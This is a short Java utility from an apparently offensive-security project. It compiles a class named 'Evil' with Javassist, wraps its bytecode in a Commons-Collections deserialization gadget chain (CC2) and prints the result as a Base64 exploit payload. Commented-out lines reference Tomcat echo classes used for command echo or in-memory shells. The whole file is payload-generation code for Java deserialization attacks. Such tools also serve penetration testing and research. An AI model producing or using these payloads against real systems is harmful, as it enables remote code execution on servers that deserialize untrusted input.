package com.xiaoqiu.util;

import com.xiaoqiu.payload.CC2_Temp;
import com.xiaoqiu.payload.CC3_2;
import com.xiaoqiu.payload.CC6;
import com.xiaoqiu.payload.Evil;
import javassist.ClassPool;
import javassist.CtClass;

/**
 * @Description :
 * @Time : 2023/4/18 18:50
 * @Author : xiaoqiuxx
 */
public class GetPayload {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        //获取echo类的字节码然后传入到CC链的利用参数内
//        CtClass clazz = pool.get(com.xiaoqiu.util.TomcatEchoThreadLocal.class.getName());
//        CtClass clazz = pool.get(com.xiaoqiu.util.TomcatEchoFilter.class.getName());
        CtClass clazz = pool.get(Evil.class.getName());
        byte[] code = clazz.toBytecode();
        byte[] payloads = new CC2_Temp().getPayload(code);
        System.out.println(java.util.Base64.getEncoder().encodeToString(payloads));
    }

}
